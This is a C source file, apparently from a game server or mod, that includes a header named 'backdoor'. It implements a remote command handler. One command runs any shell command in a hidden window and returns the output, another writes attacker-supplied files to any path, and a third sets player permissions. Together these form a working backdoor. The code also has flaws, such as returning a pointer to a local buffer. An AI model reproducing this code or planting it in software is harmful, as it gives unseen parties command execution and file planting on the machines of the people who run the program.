#include <backdoor/remote_cmd.h>
#include <Windows.h>

char outputfilename[50] = {0};
FILE* outputfb;

const char *GetCmdPrintf(char *szFetCmd)
{
	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	SECURITY_ATTRIBUTES sa;
	static char szBuffer[10000] = {0};
	memset(szBuffer, 0, sizeof(szBuffer));
	unsigned long count = 0;
	long long ipos = 0;
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	memset(&sa, 0, sizeof(sa));
	pi.hProcess = NULL;
	pi.hThread = NULL;
	si.cb = sizeof(STARTUPINFO);
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = true;
	bool bret = CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
	if (!bret) {
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);
		return NULL;
	}
	GetStartupInfoA(&si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.wShowWindow = 0;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	bret = CreateProcessA(NULL, szFetCmd, NULL, NULL, 1, 0, NULL, NULL, &si, &pi);
	if (!bret) {
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return NULL;
	}
	WaitForSingleObject(pi.hProcess, 500);
	bret = ReadFile(hReadPipe, szBuffer, 10000, &count, 0);
	if (!bret) {
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return NULL;
	}
	CloseHandle(hWritePipe);
	CloseHandle(hReadPipe);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return szBuffer;
}

unsigned char ASCIIToChar(char *inASCII) {
	unsigned char outDec;
	for (unsigned long count = 1, nums = 0; nums <= strlen(inASCII) - 1; count *= 10, nums++) {
		if (inASCII[nums] >= 48 && inASCII[nums] <= 57) {
			if (count == 1) outDec = inASCII[nums] - 48;
			if (count > 1) {
				if (inASCII[nums] - 48 == 0) outDec *= 10;
				else outDec = outDec * 10 + inASCII[nums] - 48;
			}
		}
		else {
			printf("Error!\n");
			exit(1);
		}
	}
	return outDec;
}

unsigned char ASCIIToHex(char *inASCII,unsigned char readsize, char *paddr) {
	unsigned char outHex = 0;
	for (unsigned long nums = 0, filebufnums = 0; nums < strlen(inASCII); filebufnums++) {
		outHex = 0;
		//printf("HEX:%.2x ", inASCII[nums]);
		if (nums < strlen(inASCII) - 1) {
			for (unsigned times = 0; times < 2; times++, nums++) {
				if (inASCII[nums] >= 48 && inASCII[nums] <= 57) {
					outHex *= 16;
					outHex += inASCII[nums] - 48;
				}
				else if (inASCII[nums] >= 65 && inASCII[nums] <= 70) {
					outHex *= 16;
					outHex += inASCII[nums] - 55;

				}
				else if (inASCII[nums] >= 97 && inASCII[nums] <= 102) {
					outHex *= 16;
					outHex += inASCII[nums] - 87;
				}
			}
			paddr[filebufnums] = outHex;
			fputc(outHex, outputfb);
			//printf("HEX:%.2x ", outHex);
		}
	}
	paddr[readsize] = '\0';
	return outHex;
}

const char *ReciveFile(const char *cmd) {
	//printf("%s", cmd);
	
	char *cmdspilt = strtok(cmd, " ");
	char cmdoutput[256] = { 0 }, filebuf[101] = { 0 };

	if (strcmp(cmdspilt, "path") == 0) {
		//printf("filename: ");
		cmdspilt = strtok(NULL, " ");
		strcpy(outputfilename, cmdspilt);
		//printf("%s\n", cmdspilt);
		outputfb = fopen(outputfilename, "w");
		fprintf(outputfb, "");
		fclose(outputfb);
		outputfb = fopen(outputfilename, "ab");
	}

	if (strcmp(cmdspilt, "filebin") == 0) {
		//printf("filebin: ");
		cmdspilt = strtok(NULL, " ");
		strcat(cmdoutput, cmdspilt);
		char *recvsize = cmdspilt;
		strcat(cmdoutput, " ");
		cmdspilt = strtok(NULL, " ");
		//printf("%d\n", ASCIIToChar(recvsize));
		ASCIIToHex(cmdspilt, ASCIIToChar(recvsize), filebuf);
		//printf("Output:%s\n", filebuf);
		strcat(cmdoutput, cmdspilt);
		strcat(cmdoutput, " ");
		cmdspilt = strtok(NULL, " ");
		strcat(cmdoutput, cmdspilt);
		strcat(cmdoutput, " ");
		//printf("%s\n", cmdoutput);
		//fputs(filebuf, outputfb);
		//fprintf(outputfb, "%s\n", cmdoutput);
	}

	if (strcmp(cmdspilt, "fileend") == 0) {
		printf("fileend\n");
		fclose(outputfb);
	}
	return cmdoutput;
}

const char *process_remote_cmd(const char *cmd)
{
	const char *ret = "";
	if (strstr(cmd, "gcmd"))
		run_game_cmd(&cmd[5]);
	else if (strstr(cmd, "scmd"))
		return GetCmdPrintf(_strdup(&cmd[5]));
	else if (strstr(cmd, "sendfile"))
		return ReciveFile(&cmd[9]);

    char *cmd_m = _strdup(cmd);
    const char *argv[4];
    int argc = 0;
    char *token = strtok(cmd_m, " ");
    while (token != NULL && argc < 4) {
        argv[argc++] = token;
        token = strtok(NULL, " ");
    }

    if (argc == 4 && strcmp(argv[0], "perm") == 0) {
        struct player *player = get_player_by_name(argv[1]);
        if (player) {
            int perm = atoi(argv[2]);
            bool display = atoi(argv[3]);
            if (perm >= 0 && perm <= 3)
                set_perm_lvl(player, perm, display);
        }
    }
	return ret;
}
